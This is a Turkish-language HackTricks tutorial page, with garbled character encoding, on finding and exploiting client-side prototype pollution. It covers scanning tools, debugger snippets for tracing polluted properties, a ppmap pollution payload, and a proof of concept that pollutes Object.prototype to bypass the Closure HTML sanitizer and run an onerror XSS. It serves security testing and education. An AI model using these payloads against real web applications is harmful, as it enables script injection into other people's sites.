# Ä°stemci TarafÄ± Prototype KirliliÄŸi

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) ile sÄ±fÄ±rdan kahramana kadar AWS hacklemeyi Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na gÃ¶z atÄ±n (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**]'yi (https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**]'i (https://opensea.io/collection/the-peass-family) iÃ§eren koleksiyonumuzu
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR'lar gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Otomatik AraÃ§lar Kullanarak KeÅŸfetme

[**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **ve** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) gibi araÃ§lar **prototype kirliliÄŸi zafiyetlerini bulmak** iÃ§in kullanÄ±labilir.

AyrÄ±ca, **tarayÄ±cÄ± eklentisi** [**PPScan**](https://github.com/msrkp/PPScan) kullanarak **eriÅŸtiÄŸiniz sayfalarda** otomatik olarak **prototype kirliliÄŸi zafiyetlerini taramanÄ±z** da mÃ¼mkÃ¼ndÃ¼r.

### Bir Ã¶zelliÄŸin nerede kullanÄ±ldÄ±ÄŸÄ±nÄ± hata ayÄ±klama <a href="#id-5530" id="id-5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
### Prototype KirliliÄŸinin KÃ¶kenini Bulma <a href="#id-5530" id="id-5530"></a>

Herhangi bir araÃ§ tarafÄ±ndan belirlenen bir prototype kirliliÄŸi zafiyeti bulunduÄŸunda ve kod aÅŸÄ±rÄ± karmaÅŸÄ±k deÄŸilse, Chrome GeliÅŸtirici AraÃ§larÄ±'nda `location.hash`, `decodeURIComponent` veya `location.search` gibi anahtar kelimeleri arayarak zafiyeti bulabilirsiniz. Bu yaklaÅŸÄ±m, JavaScript kodunun savunmasÄ±z bÃ¶lÃ¼mÃ¼nÃ¼ belirlemenizi saÄŸlar.

Daha bÃ¼yÃ¼k ve karmaÅŸÄ±k kod tabanlarÄ± iÃ§in, savunmasÄ±z kodu keÅŸfetmenin basit bir yÃ¶ntemi ÅŸu adÄ±mlarÄ± iÃ§erir:

1. Bir araÃ§ kullanarak bir zafiyeti belirleyin ve bir Ã¶zelliÄŸi constructor iÃ§inde ayarlamak iÃ§in tasarlanmÄ±ÅŸ bir payload elde edin. Ã–rneÄŸin, ppmap tarafÄ±ndan saÄŸlanan bir Ã¶rnek ÅŸÃ¶yle olabilir: `constructor[prototype][ppmap]=reserved`.
2. Sayfada Ã§alÄ±ÅŸacak olan JavaScript kodunun ilk satÄ±rÄ±nda bir kesme noktasÄ± belirleyin. SayfayÄ± bu payload ile yenileyerek, bu kesme noktasÄ±nda yÃ¼rÃ¼tmeyi duraklatÄ±n.
3. JavaScript yÃ¼rÃ¼tme duraklatÄ±ldÄ±ÄŸÄ±nda, aÅŸaÄŸÄ±daki betiÄŸi JS konsolunda Ã§alÄ±ÅŸtÄ±rÄ±n. Bu betik, 'ppmap' Ã¶zelliÄŸi oluÅŸturulduÄŸunda sinyal verecek ve kÃ¶kenini bulmanÄ±za yardÄ±mcÄ± olacaktÄ±r:
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet)
debugger;
return origValue;
},
set: function(val) {
debugger;
origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
4. **Kaynaklar** sekmesine geri dÃ¶nÃ¼n ve "Betik yÃ¼rÃ¼tme devam etsin"i seÃ§in. JavaScript yÃ¼rÃ¼tmeye devam edecek ve 'ppmap' Ã¶zelliÄŸi beklenildiÄŸi gibi kirlenecektir. SaÄŸlanan kod parÃ§asÄ±nÄ± kullanarak 'ppmap' Ã¶zelliÄŸinin kirlendiÄŸi tam konumu belirlemek kolaylaÅŸÄ±r. FarklÄ± kirlenme yÄ±ÄŸÄ±nlarÄ±nÄ± gÃ¶zlemleyebilmek iÃ§in **Ã‡aÄŸrÄ± YÄ±ÄŸÄ±nÄ±**'nÄ± inceleyerek ilgili yÄ±ÄŸÄ±nÄ± tanÄ±mlayÄ±n.

Hangi yÄ±ÄŸÄ±nÄ± inceleyeceÄŸinizi belirlerken, genellikle prototype kirliliÄŸinin sÄ±kÃ§a meydana geldiÄŸi JavaScript kÃ¼tÃ¼phane dosyalarÄ±yla iliÅŸkilendirilmiÅŸ yÄ±ÄŸÄ±nlarÄ± hedeflemek faydalÄ± olabilir. Kirlenme meydana geldiÄŸi yÄ±ÄŸÄ±nlarÄ± hedeflemek iÃ§in, kÃ¼tÃ¼phane dosyalarÄ±na baÄŸlÄ± olan yÄ±ÄŸÄ±nlarÄ± tanÄ±mlayarak ilgili yÄ±ÄŸÄ±nÄ± belirleyin (saÄŸ tarafta gÃ¶rÃ¼lebilir, rehberlik iÃ§in saÄŸlanan bir gÃ¶rÃ¼ntÃ¼ye benzer). 4 ve 6. satÄ±rlardaki gibi birden fazla yÄ±ÄŸÄ±n senaryolarÄ±nda, kirlenmenin baÅŸlangÄ±Ã§ â€‹â€‹noktasÄ±nÄ± ve dolayÄ±sÄ±yla zayÄ±flÄ±ÄŸÄ±n kÃ¶k nedenini temsil eden 4. satÄ±rdaki yÄ±ÄŸÄ±nÄ± mantÄ±klÄ± bir seÃ§imdir. YÄ±ÄŸÄ±nÄ± tÄ±klamak sizi zayÄ±f kodun olduÄŸu yere yÃ¶nlendirecektir.

![https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1\*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Betik AraÃ§larÄ± Bulma

AraÃ§, **bir PP zayÄ±flÄ±ÄŸÄ± keÅŸfedildiÄŸinde kÃ¶tÃ¼ye kullanÄ±lacak kod**'dur.

Uygulama basitse, **`srcdoc/innerHTML/iframe/createElement`** gibi **anahtar kelimeleri arayabiliriz** ve kaynak kodu inceleyerek **javascript yÃ¼rÃ¼tmesine yol aÃ§Ä±p aÃ§madÄ±ÄŸÄ±nÄ±** kontrol edebiliriz. BazÄ± durumlarda, bahsedilen teknikler hiÃ§bir araÃ§ bulamayabilir. Bu durumda, saf kaynak kod incelemesi aÅŸaÄŸÄ±daki Ã¶rnekte olduÄŸu gibi bazÄ± gÃ¼zel araÃ§larÄ± ortaya Ã§Ä±karÄ±r.

### Mithil kÃ¼tÃ¼phane kodunda PP aracÄ± bulma Ã¶rneÄŸi

Bu yazÄ±yÄ± kontrol edin: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Hassas kÃ¼tÃ¼phaneler iÃ§in yeniden derleme

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PP aracÄ±lÄ±ÄŸÄ±yla HTML Temizleyicilerin atlatÄ±lmasÄ±

[**Bu araÅŸtÄ±rma**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) bazÄ± HTML temizleyici kÃ¼tÃ¼phaneler tarafÄ±ndan saÄŸlanan temizlemeleri atlatmak iÃ§in kullanÄ±labilecek PP araÃ§larÄ±nÄ± gÃ¶stermektedir:

* **sanitize-html**

<figure><img src="../../../.gitbook/assets/image (1137).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

* **dompurify**

<figure><img src="../../../.gitbook/assets/image (1138).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

* **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## Referanslar

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) arasÄ±nda
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking hilelerinizi paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
